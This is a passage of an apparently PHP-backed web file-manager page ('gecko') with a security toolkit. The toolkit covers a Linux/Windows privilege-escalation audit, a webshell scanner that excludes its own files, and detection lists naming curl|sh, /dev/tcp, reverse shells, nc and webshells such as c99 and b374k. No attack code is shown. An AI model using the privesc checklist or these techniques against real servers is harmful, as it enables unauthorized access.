            <div class="sec-form-grid">
              <div class="fg"><label>Algorithm</label>
                <select id="secHashAlgo"><option value="md5">MD5</option><option value="sha1">SHA1</option><option value="sha256" selected>SHA256</option><option value="sha512">SHA512</option><option value="crc32">CRC32</option></select>
              </div>
              <div class="fg span2"><label>Input</label><textarea id="secHashText" rows="4" placeholder="Text to hash…"></textarea></div>
            </div>
            <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunHash">Generate Hash</button></div>
            <div class="sec-terminal">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — hash</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="secOutHash">Hash output.</div>
            </div>
          </div>
        </div>

        <div class="sec-panel" data-panel="codec">
          <div class="sec-panel-card">
            <div class="sec-form-grid">
              <div class="fg"><label>Mode</label>
                <select id="secCodecMode">
                  <option value="b64enc">Base64 Encode</option><option value="b64dec">Base64 Decode</option>
                  <option value="urlenc">URL Encode</option><option value="urldec">URL Decode</option>
                  <option value="rot13">ROT13</option><option value="hexenc">Hex Encode</option><option value="hexdec">Hex Decode</option>
                </select>
              </div>
              <div class="fg span2"><label>Input</label><textarea id="secCodecText" rows="4"></textarea></div>
            </div>
            <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunCodec">Transform</button></div>
            <div class="sec-terminal">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — codec</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="secOutCodec">Encoded/decoded output.</div>
            </div>
          </div>
        </div>

        <div class="sec-panel" data-panel="dns">
          <div class="sec-panel-card">
            <div class="sec-form-grid">
              <div class="fg"><label>Host</label><input type="text" id="secDnsHost" placeholder="example.com"></div>
              <div class="fg"><label>Record type</label>
                <select id="secDnsType"><option value="ALL">ALL</option><option value="A">A</option><option value="AAAA">AAAA</option><option value="MX">MX</option><option value="TXT">TXT</option><option value="NS">NS</option><option value="CNAME">CNAME</option></select>
              </div>
            </div>
            <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunDns">Lookup DNS</button></div>
            <div class="sec-terminal">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — dns</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="secOutDns">DNS records.</div>
            </div>
          </div>
        </div>

        <div class="sec-panel" data-panel="privesc">
          <div class="sec-panel-card">
            <div class="sec-actions">
              <button class="btn btn-primary btn-sm" id="secRunPrivescLinux">Audit Linux Privesc</button>
              <button class="btn btn-primary btn-sm" id="secRunPrivescWindows">Audit Windows Privesc</button>
              <button class="btn btn-ghost btn-sm" id="secRunSuid">SUID/SGID Quick</button>
              <button class="btn btn-ghost btn-sm" id="secCopyPrivesc">Copy Report</button>
            </div>
            <div class="sec-callout warn"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg><span><strong>Linux:</strong> sudo, SUID/GTFOBins, capabilities, writable /etc, docker group, NFS, cron… · <strong>Windows:</strong> token privileges, UAC, AlwaysInstallElevated, unquoted paths, services, tasks.</span></div>
            <div class="sec-terminal" style="margin-top:14px">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — privesc audit</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="secOutPrivesc">Pilih audit Linux atau Windows. Di server Linux jalankan Linux; di Windows jalankan Windows.</div>
            </div>
          </div>
        </div>

          </div>
        </div>
      </div>
    </div>
    <div class="modal-foot sec-hub-foot">
      <span class="left"><span class="sec-stat" id="secMeta">Cyber Security toolkit</span></span>
      <button class="btn mc">Close</button>
    </div>
  </div>
</div>

<div class="overlay" id="mBlueHub">
  <div class="modal m-full sec-hub-modal blue-team">
    <div class="modal-head sec-hub-head">
      <div class="sec-hub-head-left">
        <span class="sec-hub-badge">DEFENSE</span>
        <h2>Blue Team Hub</h2>
      </div>
      <button class="btn btn-ghost btn-icon mc">✕</button>
    </div>
    <div class="modal-body sec-hub-body">
      <div class="sec-hub-shell">
        <nav class="sec-hub-nav" role="tablist">
          <button class="sec-nav-btn active" data-blue="backdoor" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><path d="M12 2a4 4 0 0 1 4 4c0 1.5-.8 2.8-2 3.5V12h3a3 3 0 0 1 3 3v1H7v-1a3 3 0 0 1 3-3h3V9.5A4 4 0 0 1 12 2z"/></svg></span><span class="sec-nav-text"><strong>Backdoor</strong><small>Webshell scan</small></span></button>
          <button class="sec-nav-btn" data-blue="fullaudit" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg></span><span class="sec-nav-text"><strong>Full Audit</strong><small>All checks</small></span></button>
          <button class="sec-nav-btn" data-blue="recent" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg></span><span class="sec-nav-text"><strong>Recent</strong><small>File changes</small></span></button>
          <button class="sec-nav-btn" data-blue="writable" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><path d="M12 20h9"/><path d="M16.5 3.5a2.1 2.1 0 0 1 3 3L7 19l-4 1 1-4z"/></svg></span><span class="sec-nav-text"><strong>Writable</strong><small>777 / o+w</small></span></button>
          <button class="sec-nav-btn" data-blue="hidden" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg></span><span class="sec-nav-text"><strong>Hidden</strong><small>Dot-files</small></span></button>
          <button class="sec-nav-btn" data-blue="persistence" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/><circle cx="12" cy="12" r="3"/></svg></span><span class="sec-nav-text"><strong>Persistence</strong><small>Cron · systemd · web</small></span></button>
          <button class="sec-nav-btn" data-blue="cron" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg></span><span class="sec-nav-text"><strong>Cron</strong><small>Quick cron only</small></span></button>
          <button class="sec-nav-btn" data-blue="logs" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/><path d="M8 13h8M8 17h5"/></svg></span><span class="sec-nav-text"><strong>Logs</strong><small>Auth &amp; errors</small></span></button>
          <button class="sec-nav-btn" data-blue="ioc" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg></span><span class="sec-nav-text"><strong>IOC Hunt</strong><small>Known names</small></span></button>
          <button class="sec-nav-btn" data-blue="process" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><rect x="4" y="4" width="16" height="16" rx="2"/><path d="M9 9h6v6H9z"/></svg></span><span class="sec-nav-text"><strong>Processes</strong><small>Suspicious</small></span></button>
        </nav>
        <div class="sec-hub-main">
          <div class="sec-hero">
            <h3 id="blueHeroTitle">Backdoor Scanner</h3>
            <p id="blueHeroDesc">Deteksi webshell &amp; backdoor dengan scoring signature. File gecko dikecualikan otomatis.</p>
          </div>
          <div class="sec-hub-content">

        <div class="sec-panel active" data-bpanel="backdoor">
          <div class="sec-panel-card">
            <div class="sec-form-grid">
              <div class="fg span2"><label>Scan path (optional)</label><input type="text" id="blueScanPath" placeholder="Document root + /var/www /home /tmp /opt"></div>
              <div class="fg span2">
                <label>Aggressive mode</label>
                <div class="sec-toggle-row" onclick="document.getElementById('blueAggressive').click()">
                  <input type="checkbox" id="blueAggressive" onclick="event.stopPropagation()">
                  <span>Scan lebih luas &amp; threshold lebih rendah — risiko false positive lebih tinggi</span>
                </div>
              </div>
            </div>
            <div class="sec-actions">
              <button class="btn btn-primary btn-sm" id="blueRunBackdoor">Scan for Backdoors</button>
              <button class="btn btn-ghost btn-sm" id="blueCopyBackdoor">Copy Report</button>
            </div>
            <div class="sec-callout blue"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg><span>Quarantine memindahkan file ke <code>.gecko_quarantine/</code> — bukan hapus permanen. Review hasil sebelum quarantine.</span></div>
            <div class="sec-terminal" style="margin-top:14px">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — backdoor scan</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="blueOutBackdoor">Ready to scan.</div>
            </div>
            <div class="blue-filter-bar" id="blueFilterBar">
              <button type="button" class="blue-filter active" data-sev="ALL">All</button>
              <button type="button" class="blue-filter" data-sev="CRITICAL">Critical</button>
              <button type="button" class="blue-filter" data-sev="HIGH">High</button>
              <button type="button" class="blue-filter" data-sev="MEDIUM">Medium</button>
              <button type="button" class="blue-filter" data-sev="LOW">Low</button>
            </div>
            <div class="blue-threat-actions" id="blueThreatActions">
              <span class="blue-threat-count-pill" id="blueThreatCount">0 threats</span>
              <button class="btn btn-ghost btn-sm" id="blueSelectAll">Select All</button>
              <button class="btn btn-ghost btn-sm" id="blueSelectNone">Deselect All</button>
              <span class="sec-actions-divider"></span>
              <button class="btn btn-danger btn-sm" id="blueDeleteSelected">Quarantine Selected</button>
              <button class="btn btn-danger btn-sm" id="blueDeleteAll">Quarantine All</button>
              <button class="btn btn-ghost btn-sm" id="blueKeepAll">Dismiss</button>
            </div>
            <div class="blue-threat-wrap hidden" id="blueThreatList"></div>
          </div>

          <div class="sec-panel-card sec-quarantine-card">
            <div class="sec-quarantine-head">
              <div class="sec-q-title"><svg viewBox="0 0 24 24"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/></svg>Quarantine Vault</div>
              <button class="btn btn-ghost btn-sm" id="blueRefreshQuarantine">Refresh</button>
              <button class="btn btn-primary btn-sm" id="blueRestoreSelected">Restore Selected</button>
              <button class="btn btn-primary btn-sm" id="blueRestoreAll">Restore All</button>
            </div>
            <div class="sec-callout blue" id="blueQuarantineDir">Folder quarantine: <code>.gecko_quarantine/</code> — klik Restore untuk kembalikan file.</div>
            <div class="blue-threat-wrap" id="blueQuarantineList"><div class="blue-threat-item" style="color:var(--tx4);font-style:italic;padding:14px">No quarantined files.</div></div>
          </div>
        </div>

        <div class="sec-panel" data-bpanel="fullaudit">
          <div class="sec-panel-card">
            <div class="sec-form-grid"><div class="fg span2"><label>Scan path (optional)</label><input type="text" id="blueAuditPath" placeholder="Same as backdoor scan scope"></div></div>
            <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunFullAudit">Run Full Audit</button></div>
            <div class="sec-callout blue"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 8v4M12 16h.01"/></svg><span>Menjalankan: backdoor scan, recent changes, writable, hidden scripts, cron, IOC, processes, log audit.</span></div>
            <div class="sec-terminal" style="margin-top:14px">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — full audit</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="blueOutFullAudit">Comprehensive assessment — may take several minutes.</div>
            </div>
          </div>
        </div>

        <div class="sec-panel" data-bpanel="recent">
          <div class="sec-panel-card">
            <div class="sec-form-grid">
              <div class="fg"><label>Days</label><input type="number" id="blueRecentDays" value="7" min="1" max="90"></div>
              <div class="fg"><label>Path (optional)</label><input type="text" id="blueRecentPath" placeholder="Web root"></div>
            </div>
            <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunRecent">Find Recent Changes</button></div>
            <div class="sec-terminal">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — recent changes</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="blueOutRecent">Recently modified PHP/JS/.htaccess files.</div>
            </div>
          </div>
        </div>

        <div class="sec-panel" data-bpanel="writable">
          <div class="sec-panel-card">
            <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunWritable">Scan Writable Files</button></div>
            <div class="sec-terminal">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — writable</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="blueOutWritable">World-writable files &amp; directories (777 / o+w).</div>
            </div>
          </div>
        </div>

        <div class="sec-panel" data-bpanel="hidden">
          <div class="sec-panel-card">
            <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunHidden">Scan Hidden Scripts</button></div>
            <div class="sec-terminal">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — hidden files</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="blueOutHidden">Dot-files: .htaccess, .user.ini, hidden PHP shells.</div>
            </div>
          </div>
        </div>

        <div class="sec-panel" data-bpanel="persistence">
          <div class="sec-panel-card">
            <div class="sec-form-grid">
              <div class="fg span2"><label>Scan path (optional)</label><input type="text" id="bluePersistPath" placeholder="Web root + /home /var/www — kosongkan = default scope"></div>
            </div>
            <div class="sec-actions">
              <button class="btn btn-primary btn-sm" id="blueRunPersistence">Run Persistence Audit</button>
              <button class="btn btn-ghost btn-sm" id="blueCopyPersistence">Copy Report</button>
            </div>
            <div class="sec-callout blue"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 8v4M12 16h.01"/></svg><span>Mengecek: crontab, systemd, scheduled tasks, SSH keys, shell profile, <code>.htaccess</code>, <code>.user.ini</code>, PHP <code>auto_prepend</code>, registry Run (Windows).</span></div>
            <div class="sec-terminal" style="margin-top:14px">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — persistence audit</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="blueOutPersistence">Klik Run untuk audit persistence di server.</div>
            </div>
          </div>
        </div>

        <div class="sec-panel" data-bpanel="cron">
          <div class="sec-panel-card">
            <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunCron">Audit Cron Jobs</button></div>
            <div class="sec-terminal">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — cron audit</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="blueOutCron">Detects persistence: curl|sh, /dev/tcp, reverse shells…</div>
            </div>
          </div>
        </div>

        <div class="sec-panel" data-bpanel="logs">
          <div class="sec-panel-card">
            <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunLogs">Audit Logs</button></div>
            <div class="sec-terminal">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — log audit</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="blueOutLogs">Failed auth, sudo usage, suspicious web server errors.</div>
            </div>
          </div>
        </div>

        <div class="sec-panel" data-bpanel="ioc">
          <div class="sec-panel-card">
            <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunIoc">Hunt IOC Filenames</button></div>
            <div class="sec-terminal">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — ioc hunt</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="blueOutIoc">Known malicious filenames: c99, r57, wso, b374k, alfa…</div>
            </div>
          </div>
        </div>

        <div class="sec-panel" data-bpanel="process">
          <div class="sec-panel-card">
            <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunProcess">Scan Processes</button></div>
            <div class="sec-terminal">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — processes</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="blueOutProcess">nc, /dev/tcp, reverse shells, miners, scanners.</div>
            </div>
          </div>
        </div>

          </div>
        </div>
      </div>
    </div>
    <div class="modal-foot sec-hub-foot">
      <span class="left"><span class="sec-stat" id="blueMeta">Blue Team defensive toolkit</span></span>
      <button class="btn mc">Close</button>
    </div>
  </div>
</div>

<div class="overlay" id="mBlueDelete">
  <div class="modal m-sm tool-modal">
    <div class="modal-head"><h2><span class="tool-head-ico">📦</span>Move to Quarantine</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <p id="blueDeleteMsg" style="color:var(--tx2);font-size:14px;line-height:1.6"></p>
      <div class="sec-callout blue" style="margin-top:12px">File dipindah ke <code>.gecko_quarantine/</code> (bukan dihapus). Bisa di-restore kapan saja.</div>
    </div>
    <div class="modal-foot">
      <button class="btn mc">Cancel</button>
      <button class="btn btn-danger" id="blueDeleteConfirm">Move to Quarantine</button>
    </div>
  </div>
</div>

<div class="overlay" id="mKeyboard">
  <div class="modal m-sm tool-modal">
    <div class="modal-head"><h2><span class="tool-head-ico">⌨</span>Keyboard Shortcuts</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <div class="kbd-grid">
        <div class="kbd-row"><span>Copy selected</span><kbd>Ctrl C</kbd></div>
        <div class="kbd-row"><span>Cut selected</span><kbd>Ctrl X</kbd></div>
        <div class="kbd-row"><span>Paste to folder</span><kbd>Ctrl V</kbd></div>
        <div class="kbd-row"><span>Search files</span><kbd>Ctrl K</kbd></div>
        <div class="kbd-row"><span>Refresh</span><kbd>F5</kbd></div>
        <div class="kbd-row"><span>Clear selection</span><kbd>Esc</kbd></div>
        <div class="kbd-row"><span>Shortcuts help</span><kbd>?</kbd></div>
        <div class="kbd-row"><span>Open first search result</span><kbd>Enter</kbd></div>
        <div class="kbd-row"><span>Copy current path</span><kbd>Click statusbar</kbd></div>
      </div>
    </div>
    <div class="modal-foot"><button class="btn mc">Close</button></div>
  </div>
</div>

<div class="ctx" id="ctx"></div>

<div class="bulk-bar" id="bulkBar" role="toolbar" aria-label="Bulk actions">
  <span class="bulk-count" id="bulkCount">0</span>
  <span class="bulk-label">selected</span>
  <span class="bulk-summary" id="bulkSummary"></span>
  <span class="bulk-sep"></span>
  <button class="bulk-btn" id="bulkCopy" title="Copy (Ctrl+C)">
    <svg viewBox="0 0 16 16"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.222a.25.25 0 0 1 .25.25v7.5a.25.25 0 0 1-.25.25H1.75A1.75 1.75 0 0 1 0 13.75Zm6.5 0v7.5a1.75 1.75 0 0 0 1.75 1.75h7.5A1.75 1.75 0 0 0 17.5 13.25v-7.5A1.75 1.75 0 0 0 15.75 4h-7.5A1.75 1.75 0 0 0 6.5 5.75Z" fill="currentColor"/></svg>
    <span>Copy</span>
  </button>
  <button class="bulk-btn" id="bulkCut" title="Cut (Ctrl+X)">
    <svg viewBox="0 0 16 16"><path d="M5.921 3.862a1.25 1.25 0 0 0-1.768 0L1.075 7.94a.75.75 0 0 0 0 1.06l3.078 3.079a1.25 1.25 0 0 0 1.768 0L9.5 6.5 5.921 3.862ZM10.079 3.862a1.25 1.25 0 0 1 1.768 0l3.078 3.078a.75.75 0 0 1 0 1.06l-3.078 3.079a1.25 1.25 0 0 1-1.768 0L6.5 6.5l3.579-2.638Z" fill="currentColor"/></svg>
    <span>Cut</span>
  </button>
  <button class="bulk-btn" id="bulkPaste" title="Paste here (Ctrl+V)" disabled>
    <svg viewBox="0 0 16 16"><path d="M5.921 3.862a1.25 1.25 0 0 0-1.768 0L1.075 7.94a.75.75 0 0 0 0 1.06l3.078 3.079a1.25 1.25 0 0 0 1.768 0L9.5 6.5 5.921 3.862Z" fill="currentColor"/></svg>
    <span>Paste</span>
  </button>
  <button class="bulk-btn" id="bulkMove" title="Move to folder">
    <svg viewBox="0 0 16 16"><path d="M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.745l-1.067-1.067A.25.25 0 0 1 11.5 10.25H16v4.5a.25.25 0 0 1-.427.177l-1.068-1.068a7.002 7.002 0 0 1-11.772-3.603.75.75 0 0 1 .672-.751Z" fill="currentColor"/></svg>
    <span>Move</span>
  </button>
  <button class="bulk-btn" id="bulkZip" title="Compress to ZIP">
    <svg viewBox="0 0 16 16"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25V2.75A1.75 1.75 0 0 0 14.25 1H1.75ZM1.5 2.75a.25.25 0 0 1 .25-.25h12.5a.25.25 0 0 1 .25.25v10.5a.25.25 0 0 1-.25.25H1.75a.25.25 0 0 1-.25-.25Zm4.25 6.5a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5h-3a.75.75 0 0 1-.75-.75Z" fill="currentColor"/></svg>
    <span>Zip</span>
  </button>
  <span class="bulk-sep"></span>
  <button class="bulk-btn" id="bulkDl" title="Download selected">
    <svg viewBox="0 0 16 16"><path d="M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 14.25 14H2.75Z" fill="currentColor"/><path d="M7.25 7.567V1.75a.75.75 0 0 1 1.5 0v5.817l1.78-1.347a.75.75 0 1 1 1.042 1.078l-3.5 3.5a.75.75 0 0 1-1.06 0l-3.5-3.5a.75.75 0 0 1 1.06-1.06l2.678 2.33Z" fill="currentColor"/></svg>
    <span>Download</span>
  </button>
  <button class="bulk-btn del" id="bulkDel" title="Delete selected">
    <svg viewBox="0 0 16 16"><path d="M6.5 1.75a.25.25 0 0 1 .25-.25h2.5a.25.25 0 0 1 .25.25V3h-3V1.75Zm4.5 0V3h2.25a.75.75 0 0 1 0 1.5H2.75a.75.75 0 0 1 0-1.5H5V1.75C5 .784 5.784 0 6.75 0h2.5C10.216 0 11 .784 11 1.75ZM4.496 6.675l.66 6.6a.25.25 0 0 0 .249.225h5.19a.25.25 0 0 0 .249-.225l.66-6.6a.75.75 0 0 1 1.492.149l-.66 6.6A1.748 1.748 0 0 1 10.595 15h-5.19a1.75 1.75 0 0 1-1.741-1.575l-.66-6.6a.75.75 0 1 1 1.492-.15Z" fill="currentColor"/></svg>
    <span>Delete</span>
  </button>
  <span class="bulk-sep"></span>
  <button class="bulk-btn close" id="bulkClose" title="Clear selection (Esc)">
    <svg viewBox="0 0 16 16"><path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.75.75 0 1 1 1.06 1.06L9.06 8l3.22 3.22a.75.75 0 1 1-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 1 1-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z" fill="currentColor"/></svg>
  </button>
</div>

<div class="toasts" id="toasts"></div>

<script>
'use strict';
const BASE = '<?= addslashes($baseDir) ?>';
const API  = '?api=1';
const S = { path:'', entries:[], selected:new Set(), view:'list',
  createMode:'file', renameTarget:null, deleteTarget:null, chmodTarget:null, editorPath:null,
  termHistory:[], termHistIdx:-1, searchTimer:null,
  sortCol:'name', sortDir:'asc', lastClickIdx:-1, secReconLoaded:false,
  blueFindings:[], blueDeleteQueue:[], blueQuarantine:[], blueSevFilter:'ALL',
  editorDirty:false, editorSavedContent:'', edWordWrap:localStorage.getItem('gecko_wrap')==='1',
  clipboard:null, transferMode:'copy', transferPaths:[] };

/** Clipboard helper — works on HTTP (Clipboard API often blocked without HTTPS). */
async function copyText(text){
  const t = String(text == null ? '' : text);
  if(!t) return false;

  // 1) Modern Clipboard API (HTTPS / localhost)
  if(navigator.clipboard && typeof navigator.clipboard.writeText === 'function' && window.isSecureContext){
    try{
      await navigator.clipboard.writeText(t);
      return true;
    }catch(e){ /* fall through */ }
  }

  // 2) Fallback: temporary textarea + execCommand('copy')
  try{
    const ta = document.createElement('textarea');
    ta.value = t;
    ta.setAttribute('readonly','');
    ta.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;padding:0;border:0;outline:none;box-shadow:none;background:transparent;opacity:0;';
    document.body.appendChild(ta);
    ta.focus();
    ta.select();
    ta.setSelectionRange(0, ta.value.length);
    const ok = document.execCommand('copy');
    document.body.removeChild(ta);
    return !!ok;
  }catch(e){
    return false;
  }
}

async function copyCurrentPath(){
  const p = toAbsolutePath(S.path || '');
  if(!p){
    toast('No path to copy','error');
    return;
  }
  const ok = await copyText(p);
  if(ok) toast('Path copied: '+p);
  else toast('Copy failed','error');
}

function getFileBadges(e){
  const badges = [];
  if(e.name && e.name.startsWith('.')) badges.push('<span class="fbadge fbadge-hidden">dot</span>');
  const ln = e.name.toLowerCase();
  if(/\.env|wp-config|credentials|\.pem|id_rsa|\.git$/i.test(ln)) badges.push('<span class="fbadge fbadge-env">sens</span>');
  if(e.perm){
    const w = String(e.perm).slice(-1);
    if(/[2367]/.test(w)) badges.push('<span class="fbadge fbadge-warn">+w</span>');
  }
  if(e.modified && (Date.now()/1000 - e.modified) < 86400) badges.push('<span class="fbadge fbadge-new">new</span>');
  return badges.join('');
}

function fileMetaExtras(e){
  return {
    badges: getFileBadges(e),
    recentCls: (e.modified && (Date.now()/1000 - e.modified) < 604800) ? ' frow-recent' : '',
    isImg: !e.is_dir && /\.(jpe?g|png|gif|webp|svg|ico|bmp)$/i.test(e.name)
  };
}

function showPanelSkeleton(){
  const panel = $('#panel');
  if(!panel) return;
  panel.innerHTML = '<div class="panel-skeleton">' + Array(8).fill('<div class="sk-row"></div>').join('') + '</div>';
}

function setScanProgress(outEl, active){
  if(!outEl) return;
  const term = outEl.closest('.sec-terminal');
  if(term) term.classList.toggle('is-scanning', !!active);
  outEl.classList.toggle('loading', !!active);
}

function highlightQuery(text, q){
  if(!q) return esc(text);
  const safe = q.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  try {
    return esc(text).replace(new RegExp('('+safe+')', 'gi'), '<mark>$1</mark>');
  } catch(e){ return esc(text); }
}

function setEditorDirty(dirty){
  S.editorDirty = !!dirty;
  const dot = $('#edUnsaved');
  if(dot) dot.classList.toggle('show', S.editorDirty);
}

function applyEdWrap(){
  const area = $('#edArea');
  if(area) area.classList.toggle('wrap-mode', S.edWordWrap);
  const btn = $('#edWrapToggle');
  if(btn) btn.classList.toggle('active', S.edWordWrap);
}

function initSidebarSections(){
  $$('.sb-section-toggle').forEach(btn=>{
    btn.onclick = ()=>{
      const sec = btn.closest('.sb-section');
      if(!sec) return;
      sec.classList.toggle('open');
      btn.setAttribute('aria-expanded', sec.classList.contains('open') ? 'true' : 'false');
      const id = sec.dataset.sb;
      if(id) localStorage.setItem('gecko_sb_'+id, sec.classList.contains('open') ? '1' : '0');
    };
  });
  $$('.sb-section[data-sb]').forEach(sec=>{
    const v = localStorage.getItem('gecko_sb_'+sec.dataset.sb);
    if(v === '1'){ sec.classList.add('open'); sec.querySelector('.sb-section-toggle')?.setAttribute('aria-expanded','true'); }
    else if(v === '0'){ sec.classList.remove('open'); sec.querySelector('.sb-section-toggle')?.setAttribute('aria-expanded','false'); }
  });
}

function initThemeToggle(){
  if(localStorage.getItem('gecko_theme') === 'blue') document.documentElement.classList.add('theme-blue');
  const btn = $('#btnTheme');
  if(!btn) return;
  btn.classList.toggle('active', document.documentElement.classList.contains('theme-blue'));
  btn.onclick = ()=>{
    const on = document.documentElement.classList.toggle('theme-blue');
    localStorage.setItem('gecko_theme', on ? 'blue' : 'gold');
    btn.classList.toggle('active', on);
  };
}

function appendBcSegment(bc, segment, targetPath, isCur){
  const sep = document.createElement('span');
  sep.className = 'bc-sep';
  sep.textContent = '/';
  bc.appendChild(sep);
  const btn = document.createElement('button');
  btn.className = 'bc-btn' + (isCur ? ' bc-cur' : '');
  btn.textContent = segment;
  btn.title = targetPath;
  if(!isCur) btn.onclick = () => navigate(targetPath);
  bc.appendChild(btn);
}

function renderBcSegments(bc, segments, prefix, isWin){
  const max = 7;
  const joinSeg = (acc, seg) => isWin ? acc + '/' + seg : (acc === '' ? '/' + seg : acc + '/' + seg);
  if(segments.length <= max){
    let acc = prefix;
    segments.forEach((seg, i)=>{
      acc = joinSeg(acc, seg);
      appendBcSegment(bc, seg, acc + '/', i === segments.length - 1);
    });
    return;
  }
  let acc = prefix;
  segments.slice(0, 2).forEach(seg=>{
    acc = joinSeg(acc, seg);
    appendBcSegment(bc, seg, acc + '/', false);
  });
  const ell = document.createElement('span');
  ell.className = 'bc-ellipsis';
  ell.textContent = '…';
  ell.title = segments.slice(2, -2).join('/');
  bc.appendChild(ell);
  acc = prefix;
  segments.slice(0, segments.length - 2).forEach(seg=>{ acc = joinSeg(acc, seg); });
  segments.slice(-2).forEach((seg, i)=>{
    acc = joinSeg(acc, seg);
